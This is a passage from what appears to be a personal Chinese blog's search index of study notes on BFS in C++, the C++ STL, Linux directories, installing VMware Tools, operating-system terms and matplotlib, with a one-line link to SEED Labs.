      <url>/bfs/</url>
      
        <content type="html"><![CDATA[<h1 id="bfs"><a href="#bfs" class="headerlink" title="bfs"></a>bfs</h1><h2 id="函数写法"><a href="#函数写法" class="headerlink" title="函数写法"></a>函数写法</h2><ol><li>定义对头和队尾hh,tt</li><li>定义x和y的位置,用一个二元组去存q[N*N]</li><li>将d数组全部初始化为-1</li><li>开头的d[0][0]初始化为0</li><li>写偏移量</li><li>判断队头和队尾</li><li>auto一个t，存q还没有走的值</li><li>预处理各个方向的偏移量</li><li>判断如果合法就存进去<pre class="line-numbers language-none"><code class="language-none">#include&lt;bits&#x2F;stdc++.h&gt;using namespace std;typedef pair&lt;int,int&gt; PII;const int N &#x3D; 110;int n,m;int g[N][N],d[N][N];&#x2F;&#x2F;g数组存图，d数组存的是每一个点到起点的距离PII q[N*N];int bfs()&#123;    int hh &#x3D; 0;&#x2F;&#x2F;队头    int tt &#x3D; 0;&#x2F;&#x2F;队尾    q[0] &#x3D; &#123;0,0&#125;;&#x2F;&#x2F;xy的坐标    memset(d,-1,sizeof d);    d[0][0] &#x3D; 0;&#x2F;&#x2F;距离原点的距离为0    int dx[4] &#x3D; &#123;-1,0,1,0&#125;;    int dy[4] &#x3D; &#123;0,1,0,-1&#125;;        while(hh &lt;&#x3D; tt)&#123;        auto t &#x3D; q[hh++];        for(int i &#x3D; 0;i &lt; 4;i++)        &#123;   &#x2F;&#x2F;这个地方只是预处理，没有存进去            int x &#x3D; t.first + dx[i];            int y &#x3D; t.second + dy[i];            &#x2F;&#x2F;判断合法就可以存进去            if(x &gt;&#x3D; 0 &amp;&amp; x &lt; n &amp;&amp; y &gt;&#x3D; 0 &amp;&amp; y &lt; m &amp;&amp; g[x][y] &#x3D;&#x3D; 0 &amp;&amp; d[x][y] &#x3D;&#x3D; -1)&#123;                d[x][y] &#x3D; d[t.first][t.second] + 1;                q[++tt] &#x3D; &#123;x,y&#125;;            &#125;        &#125;    &#125;    return d[n-1][m-1];&#125;int main(void)&#123;    cin &gt;&gt; n &gt;&gt; m;    for(int i &#x3D; 0;i &lt; n;i++)&#123;        for(int j &#x3D; 0;j &lt; m;j++)&#123;            cin &gt;&gt; g[i][j];        &#125;    &#125;    cout &lt;&lt; bfs() &lt;&lt; endl;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stl</title>
      <link href="/stl/"/>
      <url>/stl/</url>
      
        <content type="html"><![CDATA[<h1 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h1><ol><li>变长数组，支持随机访问，但是不支持任意位置O(1)插入，只能在头或末尾插入</li><li>为了保证效率，元素增删一般在末尾进行<pre class="line-numbers language-none"><code class="language-none">声明#include&lt;vector&gt;vector&lt;int&gt; a;&#x2F;&#x2F;int类型的数组vector&lt;int&gt; b[233];&#x2F;&#x2F;第一维度长233（列数）固定，第二维度可以改变（列数）struct tec&#123;    int x,y;&#125;vector&lt;rec&gt; c;&#x2F;&#x2F;vector后面&lt;&gt;中添加类型,定义为结构体<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2></li><li>a.size()返回数组的大小</li><li>a.empty()返回数组是否为空，true or false</li><li>clear()//把当前数组清空</li></ol><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><ol><li>类型于stl容器中的指针，可以用<em>操作符解除引用（用</em>即可返回具体的值）<pre class="line-numbers language-none"><code class="language-none">vector&lt;int&gt;::iterator it;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>随机访问迭代器，可以把vector的迭代器与一个整数相加减，行为和指针的移动类似</li><li>两个迭代器相减，结果与指针相减类似，得到两个迭代器之间的距离</li><li>*a.begin()和a[0]效果一样</li><li>初始化<pre class="line-numbers language-none"><code class="language-none">vector&lt;int&gt; a(&#123;1,2,3&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="begin-end"><a href="#begin-end" class="headerlink" title="begin/end"></a>begin/end</h1></li><li>begin函数返回指向vector中的第一个元素的迭代器</li><li>*a.begin() == a[0]</li><li>所有的容器都可以视作一个前闭后开的结构</li><li>end函数返回vector的尾部，即vector数组的末尾的下一个位置</li><li>*a.end() == a[n] 都是越界访问，其中n = a.size()</li></ol><h1 id="front-back"><a href="#front-back" class="headerlink" title="front/back"></a>front/back</h1><ol><li>front返回vector的第一个元素，a.front() == a[0] == *a.begin()</li><li>back返回vector的最后一个元素，a.back() == a[a.size()-1] == *a.end()</li></ol><h1 id="push-back-pop-back"><a href="#push-back-pop-back" class="headerlink" title="push_back() / pop_back()"></a>push_back() / pop_back()</h1><ol><li>a.push_back(x)将x插入到vector的尾部</li><li>b.pop_back(),删除vector a的最后一个元素</li></ol><h1 id="queue-循环队列"><a href="#queue-循环队列" class="headerlink" title="queue 循环队列"></a>queue 循环队列</h1><h2 id="先进先出"><a href="#先进先出" class="headerlink" title="先进先出"></a>先进先出</h2><h1 id="priority-queue-优先队列"><a href="#priority-queue-优先队列" class="headerlink" title="priority queue 优先队列"></a>priority queue 优先队列</h1><h2 id="会优先往外弹最大值"><a href="#会优先往外弹最大值" class="headerlink" title="会优先往外弹最大值"></a>会优先往外弹最大值</h2><pre class="line-numbers language-none"><code class="language-none">声明queue&lt;int&gt; q;priority_queue&lt;int&gt; a;&#x2F;&#x2F;大根堆priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt;&gt; b;&#x2F;&#x2F;小根堆priority_queue&lt;pair&lt;int,int&gt;&gt; a;&#x2F;&#x2F;定义的是二元组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="重载大于号"><a href="#重载大于号" class="headerlink" title="重载大于号"></a>重载大于号</h2><pre class="line-numbers language-none"><code class="language-none">struct Rec&#123;    int a,b;    bool operator &gt; (const Rec&amp; t) const&#123;        return a &gt; t.a;    &#125;&#125;priority_queue(Rec) d;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="循环队列queue"><a href="#循环队列queue" class="headerlink" title="循环队列queue"></a>循环队列queue</h3><ol><li>如果越界了会从头开始循环</li><li>push  //从队尾插入</li><li>pop   //从队头弹出   </li><li>front //返回队头元素</li><li>back  //返回队尾元素</li></ol><h3 id="优先队列priority-queue"><a href="#优先队列priority-queue" class="headerlink" title="优先队列priority_queue"></a>优先队列priority_queue</h3><ol><li>push  //把元素插入堆</li><li>pop   //删除堆顶元素(优先队列中队头即为最大值)</li><li>top   //查询堆顶元素</li></ol><h3 id="注意：除了队列，栈，其余都有clear函数"><a href="#注意：除了队列，栈，其余都有clear函数" class="headerlink" title="注意：除了队列，栈，其余都有clear函数"></a>注意：除了队列，栈，其余都有clear函数</h3><ol><li>清空队列直接初始化</li><li>q = queue<int>();</li></ol><h2 id="栈stack"><a href="#栈stack" class="headerlink" title="栈stack"></a>栈stack</h2><ol><li>头文件stack,和队列相反，先进后出<pre class="line-numbers language-none"><code class="language-none">stack&lt;int&gt; stk;stk.push(1);stk.top();stk.pop();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h2><ol><li>头文件<deque></li><li>支持在两端高效插入或删除元素的连续线性存储空间</li><li>相当于是一个拓展版的vector</li><li>二者在队尾插入元素时间复杂度都是O(1)</li><li>在队头插入，vector是O(n),deque是O(n)<pre class="line-numbers language-none"><code class="language-none">deque&lt;int&gt; a;&#x2F;&#x2F;定义a.begin()a.end()a.front()a.back()a.push_back()&#x2F;&#x2F;在队尾插入一个元素a.push_front()&#x2F;&#x2F;在对头插入一个元素a[0]&#x2F;&#x2F;支持取下标随机访问一个元素a.pop_front()&#x2F;&#x2F;在对头弹出一个元素a.pop_back()&#x2F;&#x2F;在队尾弹出一个一元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="为了避免边界处理问题，都从0开始遍历，存到n-1"><a href="#为了避免边界处理问题，都从0开始遍历，存到n-1" class="headerlink" title="为了避免边界处理问题，都从0开始遍历，存到n-1"></a>为了避免边界处理问题，都从0开始遍历，存到n-1</h1><h1 id="循环队列，优先队列，栈，双端队列都没有迭代器"><a href="#循环队列，优先队列，栈，双端队列都没有迭代器" class="headerlink" title="循环队列，优先队列，栈，双端队列都没有迭代器"></a>循环队列，优先队列，栈，双端队列都没有迭代器</h1><h1 id="循环队列，优先队列和栈没有clear-函数，其他都有"><a href="#循环队列，优先队列和栈没有clear-函数，其他都有" class="headerlink" title="循环队列，优先队列和栈没有clear()函数，其他都有"></a>循环队列，优先队列和栈没有clear()函数，其他都有</h1><h1 id="set"><a href="#set" class="headerlink" title="set"></a>set</h1><ol><li>包括set和multiset两个容器，分别是有序集合和有序多重集合</li><li>有序集合(set)的元素不能重复，但是有序多重集合(multiset)可以包含若干个相等的元素<pre class="line-numbers language-none"><code class="language-none">set&lt;int&gt; s;struct Rec&#123;    ...&#125;;set&lt;Rec&gt; s;&#x2F;&#x2F;rec中必须重载小于号multiset&lt;double&gt; s;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h2><h2 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h2><h2 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h2><h2 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h2><h1 id="set-1"><a href="#set-1" class="headerlink" title="set"></a>set</h1><pre class="line-numbers language-none"><code class="language-none">set&lt;int&gt; a;multiset&lt;double&gt; b;struct Rec&#123;    int a,b;&#125;set&lt;Rec&gt; c;&#x2F;&#x2F;注意这个地方需要重载小于号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>支持size,empty,clear</li><li>迭代器，双向访问迭代器,支持*接触引用，仅支持++和–两个与算数有关的操作</li><li>不支持随机访问操作，类似于<pre class="line-numbers language-none"><code class="language-none">set&lt;int&gt;::iterator itt &#x3D; a.begin()cout &lt;&lt; *(itt+3) &lt;&lt; endl;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>会报错，因为仅支持上一个或下一个的操作，一次跳转多个的算是随机访问</li><li>插入一个元素,因为是集合，具有无序性，所以insert的时候是无序的<pre class="line-numbers language-none"><code class="language-none">a.insert(x)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查找<pre class="line-numbers language-none"><code class="language-none">s.find(x)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>在集合中查找等于x的元素，并返回该元素的迭代器，如果不存在则返回s.end()<h2 id="lower-bound-upper-bound"><a href="#lower-bound-upper-bound" class="headerlink" title="lower_bound/upper_bound"></a>lower_bound/upper_bound</h2></li><li>s.lower_bound(x),查找大于等于x的元素的最小的一个，并且返回该元素的迭代器</li><li>s.upper_bound(x),查找大于x的元素中最小的一个，并且返回该元素的迭代器<h2 id="erase"><a href="#erase" class="headerlink" title="erase"></a>erase</h2></li><li>如果it是一个迭代器，s.erase(it)从it中删除迭代器it指向的元素</li><li>如果x是一个元素，s.erase(x)从s中删除所有等于x的元素<h2 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h2></li><li>返回s中等于x的元素个数，因为是集合，所以只有0和1会返回，但如果是multiset(x),则会返回x在multiset中存在的个数，因为multiset允许重复</li></ol><h1 id="map"><a href="#map" class="headerlink" title="map"></a>map</h1><ol><li>一个键值对的key-value的映射</li><li>map的key和value可以是任意类型，其中key<pre class="line-numbers language-none"><code class="language-none">a[1] &#x3D; 2;&#x2F;&#x2F;在a[1]的位置插入2a[1000000] &#x3D; 3;&#x2F;&#x2F;在key所在的位置插入3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>和数组的区别：前后两个结构体是可以自由定义的<pre class="line-numbers language-none"><code class="language-none">a[&quot;abc&quot;] &#x3D; 2;cout &lt;&lt; a[&quot;abc&quot;] &lt;&lt; endl;结果是2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>size,empty,clear,begin,end都和set类似</li><li>insert’erase,参数必须是pair&lt;key_type,value_type&gt;,即插入的时候必须令键的类型和值的类型相匹配</li></ol><h1 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h1><ol><li>二元组<pre class="line-numbers language-none"><code class="language-none">pair&lt;int,string&gt; a;a &#x3D; &#123;3,&quot;yxc&quot;&#125;;cout &lt;&lt; a.first &lt;&lt; &#39; &#39; &lt;&lt; a.second &lt;&lt; endl;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>pair支持比较运算，先比较first,再比较second</li></ol><h1 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h1><h2 id="与-amp"><a href="#与-amp" class="headerlink" title="与 &amp;"></a>与 &amp;</h2><ol><li>0&amp;0 == 0</li><li>0&amp;1 == 0</li><li>1&amp;1 == 1</li></ol><h2 id="或"><a href="#或" class="headerlink" title="或 |"></a>或 |</h2><ol><li>0|0 == 0</li><li>1 | 0 == 1</li><li>0 | 1 == 1</li><li>1 | 1 == 1</li></ol><h2 id="非"><a href="#非" class="headerlink" title="非 ~"></a>非 ~</h2><ol><li>~0 == 1</li><li>~1 == 0</li></ol><h2 id="异或-XOR"><a href="#异或-XOR" class="headerlink" title="异或 ^ XOR"></a>异或 ^ XOR</h2><ol><li>不进位加法</li><li>0 ^ 0 == 0</li><li>1 ^ 1 =0</li><li>1 ^ 0 == 1</li><li>0 ^ 1 == 1</li><li>按照每一位进行按位异或</li></ol><h2 id="右移-gt-gt"><a href="#右移-gt-gt" class="headerlink" title="右移 &gt;&gt;"></a>右移 &gt;&gt;</h2><ol><li>求x的第k位数字:x &gt;&gt; k &amp; 1</li><li>右移k位相当于除以2的k次方</li></ol><h2 id="左移-lt-lt"><a href="#左移-lt-lt" class="headerlink" title="左移 &lt;&lt;"></a>左移 &lt;&lt;</h2><ol><li>左移k位相当于乘以2的k次方</li></ol><h2 id="求一个数的二进制表示方法："><a href="#求一个数的二进制表示方法：" class="headerlink" title="求一个数的二进制表示方法："></a>求一个数的二进制表示方法：</h2><pre class="line-numbers language-none"><code class="language-none">int a &#x3D; 13;for(int i &#x3D; n;i &gt;&#x3D; 0;i --)&#123;    cout &lt;&lt; (a &gt;&gt; i &amp; 1)&#125;这里的5是最大求到2的多少次方的位数，0是2的0次方，从n到2的0次方依次提出来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="返回x的最后一位1"><a href="#返回x的最后一位1" class="headerlink" title="返回x的最后一位1:"></a>返回x的最后一位1:</h1><ol><li>lowbit(x) = x &amp; -x</li></ol><h2 id="常用库函数"><a href="#常用库函数" class="headerlink" title="常用库函数"></a>常用库函数</h2><h3 id="在算法库中"><a href="#在算法库中" class="headerlink" title="在算法库中"></a>在<algorithm>算法库中</h3><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><ol><li>反转数组<pre class="line-numbers language-none"><code class="language-none">vector&lt;int&gt; a;reverse(a.begin(),a.end());&#x2F;&#x2F;反转数组reverse(a,a+a.size()+1);&#x2F;&#x2F;a的首部位置和a的最后一个元素的下一个位置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><img src="https://s2.loli.net/2022/05/06/LbQafHFu6lERZyT.png"></li></ol><h4 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h4><ol><li>数组判重，然后将元素放到数组开头的位置,但是重复的元素只是放到后面，不是删除</li><li>返回值：不同元素的下一个位置的指针</li><li>注意：只是去掉相邻的相同元素，必要时需要sort排序<pre class="line-numbers language-none"><code class="language-none">int m &#x3D; unique(a.begin(),a.end()) - a.begin()&#x2F;&#x2F;返回的差值是数组中不同元素的个数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><img src="https://s2.loli.net/2022/05/06/glWePkoQ8NDbuhn.png"></li><li><img src="https://s2.loli.net/2022/05/06/8goGlZO6KeLnYEh.png"></li></ol><h4 id="random-shuffle"><a href="#random-shuffle" class="headerlink" title="random_shuffle()"></a>random_shuffle()</h4><ol><li>参数和reverse()函数一样<pre class="line-numbers language-none"><code class="language-none">random_shuffle(a.begin(),a.end());<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>打乱数组</li><li>random_shuffle(a.begin(),a.end());</li><li>随机种子不一样，打乱顺序不一样</li><li>一般引用<ctime>库中的time(0)函数，生成种子；</li><li><img src="https://s2.loli.net/2022/05/06/AfJWYFN9o854l6w.png"></li></ol><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><ol><li>sort(a.begin(),a.end())从小到大</li><li>如果希望从大到小排序，则需要加上一个参数greater<int>()<pre class="line-numbers language-none"><code class="language-none">sort(a.begin(),a.end(),greater&lt;int&gt;())3. 按照自己的想法进行排序，自己写一个cmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">bool cmp(int a,int b)&#123;&#x2F;&#x2F;a是否应该排在b的前面    return a &gt; b;&#x2F;&#x2F;从大到小    return a &lt; b;&#x2F;&#x2F;从小到大    &#x2F;&#x2F;如果a应该排在b的前面，返回true,否则返回false&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>如果需要重载大于或小于号的写法<pre class="line-numbers language-none"><code class="language-none">bool opeartor&lt; (const Rec &amp;t) const&#123;    return x &lt; t.x;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用文件管理命令</title>
      <link href="/%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%92%8C%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84/"/>
      <url>/%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%92%8C%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<h1 id="相对路径："><a href="#相对路径：" class="headerlink" title="相对路径："></a>相对路径：</h1><ol><li>以引用文件之网页躲在位置为参考基础而建立出来的目录路径。</li><li>当保存不同目录的网页引用同一个文件时，所使用的路径将不相同，因此称为相对</li><li>不以/开头，默认是当前文件夹，直接选择当前文件夹下的一个文件夹分支即可</li></ol><h1 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h1><ol><li>以web站点根目录为参考基础的目录路径，之所以称为绝对，意为指当所有网页引用同一个文件时，所使用的路径都是一样的</li><li>以/开头</li></ol><h1 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h1><ol><li>每一级目录都是将/放在当前级目录后面<h1 id="不同之处"><a href="#不同之处" class="headerlink" title="不同之处"></a>不同之处</h1></li><li>描述目录路径时，采用的参考点不同</li><li>由于对网站上所有文件而言，根目录这个参考点对所有文件都是一样的，所以运用以根目录为参考点的路径描述方式才会被称为绝对路径</li></ol><h1 id="常用文件种类（-根目录下）"><a href="#常用文件种类（-根目录下）" class="headerlink" title="常用文件种类（/根目录下）"></a>常用文件种类（/根目录下）</h1><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><ol><li>常用可执行二进制文件的命令</li></ol><h2 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h2><ol><li>配置文件</li></ol><h2 id="var"><a href="#var" class="headerlink" title="var"></a>var</h2><ol><li>网站日志log会在var中</li></ol><h2 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h2><ol><li>存安装包或库文件</li></ol><h2 id="home"><a href="#home" class="headerlink" title="home"></a>home</h2><ol><li>所有用户的家目录</li></ol><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><ol><li>process，进程信息</li><li>cpuinfo：cpu信息</li></ol><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><ol><li>根目录</li></ol><h2 id="注意区分家目录和根目录"><a href="#注意区分家目录和根目录" class="headerlink" title="注意区分家目录和根目录"></a>注意区分家目录和根目录</h2><ol><li>根目录是最上一级目录,/</li><li>家目录是根目录下的一个分支,/home</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装vmware tools</title>
      <link href="/%E5%AE%89%E8%A3%85vmwaretools/"/>
      <url>/%E5%AE%89%E8%A3%85vmwaretools/</url>
      
        <content type="html"><![CDATA[<h1 id="安装vmware-tools"><a href="#安装vmware-tools" class="headerlink" title="安装vmware tools"></a>安装vmware tools</h1><ol><li>vmware窗口中点击虚拟机，选择安装vmware tools</li><li>查找VMware tools的tar.gz安装包</li><li>常规情况下应该在/media/用户名/VMware\ Tools/VMware Toolsxxxx.tar.gz</li><li>将该压缩包复制到/root下，cp /media/strongwill/VMware\ Tools/VMware Toolsxxx.tar.gz /root</li><li>cd /root</li><li>解压压缩包tar -cvzf VMwareToolsxxx.tar.gz</li><li>出现蓝色解压后的disturb文件，cd进去</li><li>执行里面的vmware-install.pl:./vmware-install.pl</li><li>一路默认安装即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机专业中各种定义</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E5%90%84%E7%A7%8D%E5%AE%9A%E4%B9%89/"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E5%90%84%E7%A7%8D%E5%AE%9A%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<h1 id="子系统"><a href="#子系统" class="headerlink" title="子系统"></a>子系统</h1><ol><li>模型元素，具有包和类的语义，子系统的行为由它所包含的类或其它子系统提供，</li><li>子系统实现一个或多个接口，这写接口定义子系统可以执行的行为</li><li>系统是一个可以独立存在的完整实体，由一组完成特定任务的功能组成</li><li>子系统顾名思义，也是一个系统，仍然是一个完整的实体，系统和子系统的概念是相对的，作为另一个系统的一部分时，系统就称为了一个子系统<h1 id="协作（i-still-dont-know）"><a href="#协作（i-still-dont-know）" class="headerlink" title="协作（i still dont know）"></a>协作（i still dont know）</h1></li><li>协作指的是主体之间互相配合一起工作</li></ol><h1 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h1><ol><li>操作系统最基本的部分，是众多应用程序对计算机硬件的安全访问的一部分硬件</li><li>基于硬件的第一层软件扩充，提供操作系统的最基本的功能，操作系统工作的基础</li><li>负责管理操作系统的进程，内存，设备驱动程序，文件和网络系统，决定了系统的性能和稳定性</li><li>总体：链接应用程序和硬件的桥梁，操作系统背后黑盒的核心</li></ol><h1 id="字符设备"><a href="#字符设备" class="headerlink" title="字符设备"></a>字符设备</h1><ol><li>在I/O传输过程中以字符为单位进行传输的串口设备，例如调制解调器，键盘和打印机</li></ol><h1 id="串口"><a href="#串口" class="headerlink" title="串口"></a>串口</h1><ol><li>串行接口简称为串口，COM接口，采用串行通信的拓展接口</li><li>串行接口指的是数据一位一位地进行传输</li><li>比喻：一串地进行行走，口径为1bit，只能一位一位地走过去</li></ol><h1 id="块设备"><a href="#块设备" class="headerlink" title="块设备"></a>块设备</h1><ol><li>存储数据以供系统存取的接口设备</li><li>例如硬盘和光驱</li></ol><h1 id="I-O设备"><a href="#I-O设备" class="headerlink" title="I/O设备"></a>I/O设备</h1><ol><li>输入/输出设备</li><li>指的是一切操作，程序或设备与计算机之间发生的数据传输过程</li></ol><h1 id="符号连接设备"><a href="#符号连接设备" class="headerlink" title="符号连接设备"></a>符号连接设备</h1><ol><li>一个符号链接文件仅包含有一个文本字符串，其被操作系统解释为一条指向另一个文件或者目录的路径。它是一个独立文件，其存在并不依赖于目标文件。如果删除一个符号链接，它指向的目标文件不受影响。如果目标文件被移动、重命名或者删除，任何指向它的符号链接仍然存在，但是它们将会指向一个不复存在的文件。这种情况被有时被称为被遗弃。</li><li>我认为是和快捷链接类似的</li></ol><h1 id="管道文件"><a href="#管道文件" class="headerlink" title="管道文件"></a>管道文件</h1><ol><li>分为无名管道和有名管道两种</li><li>管道文件是建立在内存之上可以同时被两个进程访问的文件</li><li>有名管道可以在任意两个进程之间通讯，而无名管道只能在父子进程之间通迅。</li><li>写入管道的数据存储在内存中，而不是磁盘中，所以写入管道的数据读写更快</li></ol><h1 id="挂载点："><a href="#挂载点：" class="headerlink" title="挂载点："></a>挂载点：</h1><ol><li>把一部分硬盘容量分成一个文件夹的形式，用来干一些事情，这个文件夹就叫做挂载点</li></ol>]]></content>
      
      
      <categories>
          
          <category> 定义 </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ing </tag>
            
            <tag> 定义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib和pylab区别的精简总结</title>
      <link href="/matplotlib%E5%92%8Cpylab%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/matplotlib%E5%92%8Cpylab%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="网上的大部分解释"><a href="#网上的大部分解释" class="headerlink" title="网上的大部分解释"></a>网上的大部分解释</h1><ol><li>pyplot:方便快速绘图,matplotlib通过pyplot模块提供了与一套和MATLAB类似的绘图API，将众多绘图对象构成的复杂结构隐藏在这套API内部<br>2， pylab:matplotlib还提供了一个名为pylab的模块，其中包含许多Numpy和pyplot模块中常用的函数<h1 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h1></li><li>pylab = pyplot+大部分numpy</li><li>也就是说pylab只是提供了一个方便的导入常用包的接口<h1 id="和matlab的区别："><a href="#和matlab的区别：" class="headerlink" title="和matlab的区别："></a>和matlab的区别：</h1></li><li>在matlab中，画了一条线以后，如果想接着画另一条线，则需要hold on函数</li><li>python中直接画即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据可视化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据可视化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>seedlabs</title>
      <link href="/seedlabs(%E6%9B%B4%E6%96%B0%E4%B8%AD)/"/>
      <url>/seedlabs(%E6%9B%B4%E6%96%B0%E4%B8%AD)/</url>
      
        <content type="html"><![CDATA[<h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h1><ol><li><a href="http://www.cis.syr.edu/~wedu/seed/">http://www.cis.syr.edu/~wedu/seed/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib</title>
      <link href="/matplotlib/"/>
      <url>/matplotlib/</url>
      
        <content type="html"><![CDATA[<h1 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h1><pre class="line-numbers language-none"><code class="language-none"># 导入 matplotlib 的所有内容（nympy 可以用 np 这个名字来使用）from pylab import *# 创建一个 8 * 6 点（point）的图，并设置分辨率为 80figure(figsize&#x3D;(8,6), dpi&#x3D;80)# 创建一个新的 1 * 1 的子图，接下来的图样绘制在其中的第 1 块（也是唯一的一块）subplot(1,1,1)X &#x3D; np.linspace(-np.pi, np.pi, 256,endpoint&#x3D;True)C,S &#x3D; np.cos(X), np.sin(X)# 绘制余弦曲线，使用蓝色的、连续的、宽度为 1 （像素）的线条plot(X, C, color&#x3D;&quot;blue&quot;, linewidth&#x3D;1.0, linestyle&#x3D;&quot;-&quot;)# 绘制正弦曲线，使用绿色的、连续的、宽度为 1 （像素）的线条plot(X, S, color&#x3D;&quot;green&quot;, linewidth&#x3D;1.0, linestyle&#x3D;&quot;-&quot;)# 设置横轴的上下限xlim(-4.0,4.0)# 设置横轴记号xticks(np.linspace(-4,4,9,endpoint&#x3D;True))# 设置纵轴的上下限ylim(-1.0,1.0)# 设置纵轴记号yticks(np.linspace(-1,1,5,endpoint&#x3D;True))# 以分辨率 72 来保存图片# savefig(&quot;exercice_2.png&quot;,dpi&#x3D;72)# 在屏幕上显示show()<span aria-hidden="true" 